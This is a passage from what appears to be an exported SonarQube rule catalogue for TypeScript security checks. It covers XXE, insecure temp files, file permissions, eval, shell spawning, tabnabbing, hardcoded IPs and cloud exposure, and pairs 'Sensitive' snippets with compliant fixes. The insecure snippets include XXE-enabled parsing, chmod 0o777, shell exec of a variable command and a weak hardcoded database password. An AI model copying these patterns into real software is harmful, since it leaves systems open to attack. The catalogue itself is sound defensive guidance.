libxmljs.parseXmlString(xml, {
    noblanks: true,
    noent: true, // Noncompliant
    nocdata: true
});
</pre>
<h4>Compliant solution</h4>
<p><code>parseXmlString</code> is safe by default.</p>
<pre data-diff-id="1" data-diff-type="compliant">
var libxmljs &#61; require(&#39;libxmljs&#39;);
var fs &#61; require(&#39;fs&#39;);

var xml &#61; fs.readFileSync(&#39;xxe.xml&#39;, &#39;utf8&#39;);
libxmljs.parseXmlString(xml);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5443">
              typescript:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const fs &#61; require(&#39;fs&#39;);

let tmp_file &#61; &#34;/tmp/temporary_file&#34;; // Sensitive
fs.readFile(tmp_file, &#39;utf8&#39;, function (err, data) {
  // ...
});
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);

let tmp_dir &#61; process.env.TMPDIR; // Sensitive
fs.readFile(tmp_dir &#43; &#34;/temporary_file&#34;, &#39;utf8&#39;, function (err, data) {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
const tmp &#61; require(&#39;tmp&#39;);

const tmpobj &#61; tmp.fileSync(); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1525">
              typescript:S1525
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS4507&amp;rule_key&#61;javascript%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h3>Noncompliant code example</h3>
<pre>
for (i &#61; 1; i&lt;5; i&#43;&#43;) {
  // Print i to the Output window.
  Debug.write(&#34;loop index is &#34; &#43; i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h3>Compliant solution</h3>
<pre>
for (i &#61; 1; i&lt;5; i&#43;&#43;) {
  // Print i to the Output window.
  Debug.write(&#34;loop index is &#34; &#43; i);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2612">
              typescript:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html" rel="nofollow"><code>fs</code></a></p>
<pre>
const fs &#61; require(&#39;fs&#39;);

fs.chmodSync(&#34;/tmp/fs&#34;, 0o777); // Sensitive
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises;

fsPromises.chmod(&#34;/tmp/fsPromises&#34;, 0o777); // Sensitive
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle &#61; fsPromises.open(&#39;/tmp/fsPromises&#39;, &#39;r&#39;);
    filehandle.chmod(0o777); // Sensitive
  } finally {
    if (filehandle !&#61;&#61; undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask" rel="nofollow"><code>process.umask</code></a></p>
<pre>
const process &#61; require(&#39;process&#39;);

process.umask(0o000); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html" rel="nofollow"><code>fs</code></a></p>
<pre>
const fs &#61; require(&#39;fs&#39;);

fs.chmodSync(&#34;/tmp/fs&#34;, 0o770); // Compliant
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises;

fsPromises.chmod(&#34;/tmp/fsPromises&#34;, 0o770); // Compliant
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle &#61; fsPromises.open(&#39;/tmp/fsPromises&#39;, &#39;r&#39;);
    filehandle.chmod(0o770); // Compliant
  } finally {
    if (filehandle !&#61;&#61; undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask" rel="nofollow"><code>process.umask</code></a></p>
<pre>
const process &#61; require(&#39;process&#39;);

process.umask(0o007); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1523">
              typescript:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the
same way as calls to <code>eval</code> or <code>Function</code> constructor.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_%28computer_security%29" rel="nofollow">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.&#43;Create&#43;a&#43;secure&#43;sandbox&#43;using&#43;a&#43;security&#43;manager" rel="nofollow">Security Managers</a> in java, <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp" rel="nofollow">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy" rel="nofollow">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
let value &#61; eval(&#39;obj.&#39; &#43; propName); // Sensitive
let func &#61; Function(&#39;obj&#39; &#43; propName); // Sensitive
location.href &#61; &#39;javascript:void(0)&#39;; // Sensitive
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4721">
              typescript:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> OS command name or parameters are user-controlled. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);

// A shell will be spawn in these following cases:
cp.exec(cmd); // Sensitive
cp.execSync(cmd); // Sensitive

cp.spawn(cmd, { shell: true }); // Sensitive
cp.spawnSync(cmd, { shell: true }); // Sensitive
cp.execFile(cmd, { shell: true }); // Sensitive
cp.execFileSync(cmd, { shell: true }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);

cp.spawnSync(&#34;/usr/bin/file.exe&#34;, { shell: false }); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5148">
              typescript:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: &#34;http://example.com/mylink&#34;) on a popular website that changes, when opened, the original page to
&#34;http://example.com/fake_login&#34;. On &#34;http://example.com/fake_login&#34; there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application opens untrusted external URL. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88&#43;, Firefox 79&#43; or Safari 12.1&#43; <code>target&#61;_blank</code> on anchors implies <code>rel&#61;noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
window.open(&#34;https://example.com/dangerous&#34;);
</pre>
<h2>Compliant Solution</h2>
<pre>
window.open(&#34;https://example.com/dangerous&#34;, &#34;WindowName&#34;, &#34;noopener&#34;);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" rel="nofollow">Reverse Tabnabbing</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/1022" rel="nofollow">MITRE, CWE-1022</a> - Use of Web Link to Untrusted Target with window.opener Access </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mathiasbynens.github.io/rel-noopener/" rel="nofollow">https://mathiasbynens.github.io/rel-noopener/</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1313">
              typescript:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip &#61; &#34;192.168.12.42&#34;; // Sensitive

const net &#61; require(&#39;net&#39;);
var client &#61; new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
ip &#61; process.env.IP_ADDRESS; // Compliant

const net &#61; require(&#39;net&#39;);
var client &#61; new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID). </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6327">
              typescript:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The topic contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from &#39;aws-cdk-lib/aws-sns&#39;;

new Topic(this, &#39;exampleTopic&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { Topic, CfnTopic } from &#39;aws-cdk-lib/aws-sns&#39;;

new CfnTopic(this, &#39;exampleCfnTopic&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from &#39;aws-cdk-lib/aws-sns&#39;;

const encryptionKey &#61; new Key(this, &#39;exampleKey&#39;, {
    enableKeyRotation: true,
});

new Topic(this, &#39;exampleTopic&#39;, {
    masterKey: encryptionKey
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { CfnTopic } from &#39;aws-cdk-lib/aws-sns&#39;;

const encryptionKey &#61; new Key(this, &#39;exampleKey&#39;, {
    enableKeyRotation: true,
});

cfnTopic &#61; new CfnTopic(this, &#39;exampleCfnTopic&#39;, {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html" rel="nofollow">AWS Documentation</a> - Encryption at rest </li><li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/" rel="nofollow">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6329">
              typescript:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.Instance(this, &#34;example&#34;, {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnInstance(this, &#34;example&#34;, {
    instanceType: &#34;t2.micro&#34;,
    imageId: &#34;ami-0ea0f26a6d50850c5&#34;,
    networkInterfaces: [
        {
            deviceIndex: &#34;0&#34;,
            associatePublicIpAddress: true, // Sensitive
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html" rel="nofollow">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new dms.CfnReplicationInstance(
    this, &#34;example&#34;, {
    replicationInstanceClass: &#34;dms.t2.micro&#34;,
    allocatedStorage: 5,
    publiclyAccessible: true, // Sensitive
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const rdsSubnetGroupPublic &#61; new rds.CfnDBSubnetGroup(this, &#34;publicSubnet&#34;, {
    dbSubnetGroupDescription: &#34;Subnets&#34;,
    dbSubnetGroupName: &#34;publicSn&#34;,
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PUBLIC
    }).subnetIds
})

new rds.CfnDBInstance(this, &#34;example&#34;, {
    engine: &#34;postgres&#34;,
    masterUsername: &#34;foobar&#34;,
    masterUserPassword: &#34;12345678&#34;,
    dbInstanceClass: &#34;db.r5.large&#34;,
    allocatedStorage: &#34;200&#34;,
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPublic.ref,
    publiclyAccessible: true, // Sensitive
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.Instance(
    this,
    &#34;example&#34;, {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnInstance(this, &#34;example&#34;, {
    instanceType: &#34;t2.micro&#34;,
    imageId: &#34;ami-0ea0f26a6d50850c5&#34;,
